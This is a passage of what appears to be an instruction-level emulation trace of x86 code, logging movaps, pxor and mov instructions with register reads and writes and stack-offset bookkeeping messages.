ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x4276de: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4276eb: pxor xmm2, xmmword ptr [ebp - 0x100], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x4276f3: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4276f7: movaps xmm0, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 0x427702: movaps xmmword ptr [ebp - 0x1a0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x427709: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x427716: pxor xmm5, xmmword ptr [ebp - 0x110], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x42771e: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427722: movaps xmm0, xmmword ptr [ebp - 0x230], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x42772d: movaps xmmword ptr [ebp - 0x140], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x427734: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x427741: pxor xmm7, xmmword ptr [ebp - 0xc0], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x427749: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42774d: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427754: movaps xmmword ptr [ebp - 0x130], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x42775b: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x427768: pxor xmm6, xmmword ptr [ebp - 0x1f0], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e10 for stack size 0x10000 0x427770: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427774: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x42777b: movaps xmmword ptr [ebp - 0xc0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x427782: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42778f: pxor xmm6, xmmword ptr [ebp - 0x200], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 0x427797: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42779b: movaps xmm0, xmmword ptr [ebp - 0xc0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x4277a6: movaps xmmword ptr [ebp - 0x100], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x4277ad: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4277ba: pxor xmm2, xmmword ptr [ebp - 0xa0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 0x4277c2: movaps xmmword ptr [ebp - 0xa0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x4277c9: movaps xmm3, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 0x4277d0: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4277d4: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x4277d7: movaps xmmword ptr [ebp - 0xa0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x4277e2: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4277ef: pxor xmm3, xmmword ptr [ebp - 0x230], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x4277f7: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4277fb: movaps xmm0, xmmword ptr [ebp - 0xa0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 0x42780a: movaps xmmword ptr [ebp - 0x110], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x427811: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42781e: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427822: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427826: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x427829: movaps xmm3, xmmword ptr [ebp - 0x1a0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x427834: movaps xmmword ptr [ebp - 0x150], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42783b: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42783e: movaps xmm2, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x42784f: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427853: movaps xmm4, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 0x42785a: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42785e: movaps xmmword ptr [ebp - 0x160], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42786e: movaps xmm6, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x42787d: movaps xmm5, xmmword ptr [ebp - 0x240], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x427884: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x42788f: movaps xmm1, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x427896: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x4278a1: movaps xmm0, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x4278b0: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x4278b3: mov esi, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x4278b6: mov edx, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x4278d0: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x4278d3: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x4278de: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4278ec: mov ecx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x4278f3: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4278fb: movaps xmm1, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x427910: mov esi, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x427917: movaps xmm5, xmmword ptr [ebp - 0x2b0], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7d50 for stack size 0x10000 0x42791e: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427930: mov ecx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x427933: movaps xmm6, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x42793a: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x427945: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42794d: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x427953: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x427956: movaps xmm0, xmmword ptr [ebp - 0x260], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 0x42797d: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427984: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x427987: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427996: mov ecx, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x42799d: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4279ac: mov ecx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x4279b3: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4279c2: mov ecx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x4279c5: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4279cc: movaps xmm6, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 0x4279de: movaps xmm5, xmmword ptr [ebp - 0x270], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 0x4279e5: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x4279f0: movaps xmm1, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x4279f7: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x427a02: movaps xmm0, xmmword ptr [ebp - 0x280], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7d80 for stack size 0x10000 0x427a11: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x427a2c: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x427a2f: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427a32: mov dword ptr [ebp - 0x4c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x427a39: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427a44: mov edi, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x427a4a: mov ecx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x427a51: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427a59: movaps xmm1, xmmword ptr [ebp - 0x2a0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7d60 for stack size 0x10000 0x427a76: movaps xmm5, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x427a7d: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427a8d: mov dword ptr [ebp - 0x60], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x427a96: mov ecx, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x427a99: movaps xmm6, xmmword ptr [ebp - 0x290], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 0x427aa0: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x427aa3: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x427aa6: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427aae: mov dword ptr [ebp - 0x64], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x427ab1: mov esi, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x427ab4: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x427aba: mov ecx, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x427abd: movaps xmm0, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x427ade: mov dword ptr [ebp - 0x5c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x427ae9: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427af0: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x427af3: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427aff: mov dword ptr [ebp - 0x58], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x427b05: mov ecx, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x427b0c: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427b1b: mov ecx, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x427b1e: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427b22: movaps xmm7, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x427b29: movaps xmm5, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x427b33: mov ecx, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x427b36: movaps xmm6, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x427b40: mov ecx, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x427b43: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427b47: movaps xmm4, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x427b51: mov esi, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x427b5a: mov dword ptr [ebp - 0x70], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x427b94: mov dword ptr [ebp - 0x50], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x427b97: mov edx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x427b9a: mov dword ptr [ebp - 0x74], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x427b9d: mov dword ptr [ebp - 0x4c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x427baa: movaps xmm4, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x427bb1: movaps xmm7, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 0x427bb8: movaps xmm5, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x427bbf: movaps xmm6, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x427bd2: mov ecx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 0x427bd5: mov edx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x427bd8: mov dword ptr [ebp - 0x7c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x427bdb: mov ecx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x427bde: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x427be1: mov ecx, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x427be4: mov dword ptr [ebp - 0x6c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x427be7: mov ecx, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x427bfd: mov dword ptr [ebp - 0x6c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x427c00: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x427c05: mov ecx, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x427c0b: mov edx, dword ptr [ebp - 0x7c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 0x427c11: mov ecx, 5, regs_read: (), regs_write: [22] 0x427c1c: movaps xmmword ptr [ebp - 0x210], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x427c23: movaps xmmword ptr [ebp - 0x200], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x427c2a: movaps xmmword ptr [ebp - 0xb0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x427c31: movaps xmmword ptr [ebp - 0x1f0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x427c38: movaps xmmword ptr [ebp - 0x180], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x427c40: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427c47: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x427c54: pxor xmm1, xmm7, regs_read: [123, 129], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427c58: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427c5c: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x427c68: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x427c75: pxor xmm5, xmm4, regs_read: [127, 126], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427c79: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427c81: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427c84: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x427c91: pxor xmm2, xmmword ptr [ebp - 0xb0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x427c99: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427c9d: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x427ca4: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x427cb1: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427cb5: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427cc2: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x427ccf: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427cd3: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427cd7: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427ce3: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x427cea: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x427cfc: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d00: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d04: movaps xmm1, xmmword ptr [ebp - 0xd0], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x427d0f: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x427d1c: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d20: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d24: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x427d35: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x427d42: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d46: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d4e: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x427d5b: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d5f: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d63: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427d6f: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x427d7c: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d80: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427d88: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x427d95: pxor xmm2, xmmword ptr [ebp - 0xd0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x427d9d: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427da1: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x427da8: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x427dab: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x427db8: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427dbc: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427dc9: movaps xmm3, xmm1, regs_read: [123], regs_write: [125] 0x427dd6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427ddf: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427de8: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x427deb: movaps xmmword ptr [ebp - 0xb0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x427df6: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x427e03: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e07: pxor xmm2, xmm1, regs_read: [124, 123], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e14: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x427e21: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e25: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e32: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x427e3f: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e43: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427e50: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x427e52: movaps xmm1, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 0x427e59: movaps xmm0, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7df0 